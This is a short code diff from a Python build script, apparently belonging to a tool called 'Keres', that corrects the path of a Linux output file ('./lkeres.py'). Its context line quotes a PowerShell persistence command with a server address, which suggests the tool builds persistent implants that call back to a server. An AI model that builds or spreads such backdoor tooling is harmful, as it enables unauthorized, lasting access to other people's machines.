@@ -212,7 +212,7 @@ Start-PersistentCommand -UniqueIdentifier "Keres" -ServerAddress "{server_addres
 
     if args.platform =='Linux':
         
-        create_linux(".lkeres.py")
+        create_linux("./lkeres.py")
         print("Finished creating the executable in Output folder.")
         sys.exit()
 
